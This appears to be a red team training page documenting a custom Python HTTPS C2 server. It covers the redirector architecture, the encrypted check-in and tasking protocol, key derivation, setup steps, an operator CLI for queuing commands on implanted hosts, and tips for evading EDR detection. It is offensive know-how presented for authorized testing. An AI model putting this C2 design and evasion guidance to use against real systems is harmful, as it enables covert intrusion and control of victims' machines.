---
layout: training-page
title: "Custom HTTPS C2 Server — Red Team Academy"
module: "C2 Frameworks"
tags:
  - c2
  - custom-c2
  - python
  - aes-gcm
  - infrastructure
page_key: "c2-frameworks-custom-c2-server"
render_with_liquid: false
---

# Custom HTTPS C2 Server (rta-c2)

A full, working HTTPS C2 server written in Python. Small enough to audit in an afternoon, big enough to run a real engagement. Source lives in `jekyll-site/scripts/rta-infra/c2-server/`.

**Authorized use only.** This is reference tooling for penetration tests, red team engagements, and CTF competitions. Do not deploy against systems you do not own or have explicit written authorization to test.

---

## Why Build Your Own C2

The major frameworks — Cobalt Strike, Sliver, Havoc, Mythic — are excellent, but they ship with fingerprints. Every default certificate, every default URI, every default JA3 hash is in every EDR vendor's detection rules. The moment you set up a Sliver listener with defaults, a dozen signatures already match.

A small custom C2 has three advantages:

1. **No default signatures.** Nothing to match because nothing is published.
2. **Pretext-shaped traffic.** The HTTP surface looks like whatever you want it to look like — a CDN origin, a telemetry endpoint, a CRM webhook.
3. **Auditable.** You can read the entire codebase in one sitting. Every byte sent over the wire is yours to explain during the post-engagement report.

The tradeoff: you write the post-exploitation tooling yourself. This page ships with a minimal operator CLI and a Go implant (see [Custom Go Implant](/tool-dev/custom-go-implant/)) — enough for command execution, file transfer, and tasking. Anything more specialised (Kerberos ticketing, LDAP queries, BOF loading) you build on top.

---

## Architecture

```
     Target host                     Redirector                Team server
  ┌──────────────┐       HTTPS      ┌───────────┐   HTTPS     ┌─────────────┐
  │  rta-beacon  │ ───────────────► │  nginx    │ ──────────► │   rta-c2    │
  │  (Go)        │ ◄─────────────── │  (80/443) │ ◄────────── │  (Python)   │
  └──────────────┘                  └───────────┘             └──────┬──────┘
                                                                     │
                                                                     ▼
                                                              ┌─────────────┐
                                                              │  sqlite db  │
                                                              └──────┬──────┘
                                                                     │
                                                                     ▼
                                                              ┌─────────────┐
                                                              │  rta-cli    │
                                                              │ (operator)  │
                                                              └─────────────┘
```

- The server binds to `127.0.0.1:8443` on the team server. It is not reachable from the internet directly.
- The redirector (Nginx) terminates TLS with a legitimate cert for its public hostname, then proxies `/api/v1/*` over the WireGuard mesh to `10.8.0.10:8443`.
- Every byte between the implant and the server is AES-256-GCM encrypted with a per-implant key derived from a campaign master key. The HTTPS layer is pretext only — even if someone MITMs the traffic, the bodies are opaque.
- Operators use `rta-cli` locally on the team server (via SSH over VPN) to queue commands and read results. Operators never touch the HTTP listener.

---

## Protocol

Two endpoints only. Everything else returns a decoy 200.

### `POST /api/v1/ping`
Implant check-in. Body:

```json
{
  "id": "rta-a1b2c3d4",
  "data": "<base64(nonce || AES256-GCM(implant_key, metadata_json))>"
}
```

Where `metadata_json` is `{"id": "...", "hostname": "...", "username": "...", "os": "...", "arch": "..."}`.

Server response (encrypted with the same implant key):

```json
{ "t": "exec", "tid": 42, "cmd": "whoami" }
```

or `{"t": "noop"}` if there is nothing queued.

### `POST /api/v1/result`
Implant returns task output. Body:

```json
{
  "id": "rta-a1b2c3d4",
  "data": "<base64(nonce || AES256-GCM(implant_key, {\"tid\": 42, \"out\": \"...\"}))>"
}
```

Everything else — `GET /`, `GET /favicon.ico`, `GET /robots.txt`, random scans — returns a generic `nginx` welcome page. A defender browsing the hostname sees nothing interesting.

---

## Key Derivation

One master key per campaign, 32 bytes, stored in `/var/lib/rta-c2/master.key` on the team server with `0600` permissions. Per-implant keys are derived as:

```
implant_key = blake2b(master_key || implant_id, digest=32, person=b"rta-c2-v1")
```

The implant ships with its own `implant_id` hard-coded at build time and knows the per-implant key directly. The master key never leaves the team server. If an implant is captured and reversed, the attacker gets only that implant's key — not the campaign key, not the other implants.

---

## Install & Run

```bash
# On the team server
apt -y install python3-pip
pip install flask cryptography

mkdir -p /var/lib/rta-c2
cd /opt
git clone <this repo>  # or scp the scripts/rta-infra/ tree across
cd red-team-academy/jekyll-site/scripts/rta-infra/c2-server

# Generate a TLS cert (the redirector already has a real cert;
# this one is only for the WG-internal leg)
openssl req -x509 -newkey rsa:2048 -nodes -keyout /var/lib/rta-c2/key.pem \
    -out /var/lib/rta-c2/cert.pem -days 365 \
    -subj "/CN=api.internal"

# First run generates the master key automatically
python3 server.py --host 127.0.0.1 --port 8443 \
    --cert /var/lib/rta-c2/cert.pem --key /var/lib/rta-c2/key.pem
```

Put it behind a systemd unit so it restarts on failure:

```ini
[Unit]
Description=rta-c2 HTTPS C2 server
After=network.target

[Service]
Type=simple
WorkingDirectory=/opt/rta-c2
Environment=RTA_C2_SYSLOG=10.8.0.50
ExecStart=/usr/bin/python3 /opt/rta-c2/server.py
Restart=on-failure
RestartSec=5
User=rtops
Group=rtops

[Install]
WantedBy=multi-user.target
```

---

## Operator CLI

`rta-cli.py` is a small SQLite-backed operator tool. It runs on the team server as your operator user and writes directly to the database — it does not talk to the HTTP listener.

```bash
# List implants
$ rta-cli list
ID            HOST                USER            OS        IP                LAST
rta-a1b2c3d4  WORKSTATION-42      CORP\alice      windows   10.20.30.40       12s

# Queue a command
$ rta-cli task rta-a1b2c3d4 "whoami /all"
queued tid=7 for rta-a1b2c3d4: whoami /all

# Inspect history
$ rta-cli tasks rta-a1b2c3d4
TID   STATUS      OP          COMMAND
7     sent        alice       whoami /all
6     done        alice       hostname
5     done        alice       ipconfig

# Pull a task's output
$ rta-cli out 6
# implant=rta-a1b2c3d4  command=hostname
WORKSTATION-42

# Pin a note to an implant
$ rta-cli note rta-a1b2c3d4 "tier1 foothold — user cert stolen, pivot candidate"
```

The CLI logs the operator name (`$RTA_OPERATOR` or `$USER`) on every task, so the audit trail in the `tasks` table answers "who ran what, when" without extra logging.

---

## OPSEC Notes

Things the server does to stay quiet:

- **No framework fingerprints.** `Server: nginx`, `Cache-Control: no-store`, no `X-Powered-By`, no cookies. The response headers match a generic Nginx origin.
- **Decoy root.** `GET /` returns the Apache-default "It works!" page. Scanners and curious analysts see a content-free box.
- **Unknown paths return 404**, not a debug page. Flask's debug mode is off.
- **Encrypted bodies.** A defender capturing the TLS-decrypted HTTPS (via a corporate MITM proxy) sees base64 blobs, not plaintext commands.
- **Per-implant keys.** One reversed implant does not compromise others.
- **Bind to localhost.** The listener is invisible from outside the WireGuard mesh.
- **Remote syslog.** Every task and result is shipped to the log aggregator. Even if the team server is burned mid-engagement, the audit trail survives.

Things the server **does not** do that a production C2 should:

- **JA3/JA4 randomisation.** Python's `ssl` uses a consistent fingerprint. For high-EDR environments, front everything with Nginx (which has a more common JA3) and do not let the implant touch the Python TLS stack directly. The redirector config in `scripts/rta-infra/redirector/nginx.conf` handles this.
- **Malleable profiles.** Traffic shape is fixed. If you need to match a specific pretext (Slack webhook, Okta callback), edit the route table in `server.py`. The structure is small enough to fork per-engagement.
- **Beacon jitter on the server side.** Jitter is enforced by the implant, not the server. Adjust in the implant source before compiling.

---

## Extending the Server

Common additions and where they go:

- **File upload/download.** Add `/api/v1/up` and `/api/v1/dn` routes that chunk binary payloads through the same encrypted envelope. Store under `/var/lib/rta-c2/files/<implant_id>/`.
- **Screenshots.** Treat as a file upload with a `screenshot` task type. The implant captures, encrypts, and POSTs.
- **SOCKS proxy.** Add a `socks` task that opens a WebSocket back-channel from the implant. Wrap it with `chisel`-style framing.
- **Multi-tenant operators.** Replace the `operator` field with a per-operator API token and gate `rta-cli` behind it.
- **Beacon profiles.** Per-implant jitter, sleep, and kill date. Add columns to the `implants` table and include them in the `noop`/`exec` response envelope.

Keep the extensions small. The whole point of a custom C2 is that it stays auditable. The moment it grows past ~1000 lines, start asking whether you should be using a mature framework instead.

---

## Pairing With the Implant

This server is designed to pair with the Go implant in [Custom Go Implant](/tool-dev/custom-go-implant/). The wire format, key derivation, and endpoint names all match. You can also write implants in Rust, C++, or C# against the same protocol — the crypto is standard AES-GCM, and the JSON envelope is four fields.

---

## Resources

- Source: `jekyll-site/scripts/rta-infra/c2-server/server.py`
- Operator CLI: `jekyll-site/scripts/rta-infra/c2-server/rta-cli.py`
- AES-GCM reference — `cryptography.io/en/latest/hazmat/primitives/aead/`
- Flask production guidance — `flask.palletsprojects.com/en/latest/deploying/`
- Related: [Engagement Infrastructure](/c2-frameworks/engagement-infrastructure/), [Team Server Build-Out](/c2-frameworks/teamserver-buildout/), [Custom Go Implant](/tool-dev/custom-go-implant/), [C2 Redirectors](/c2-frameworks/redirectors/)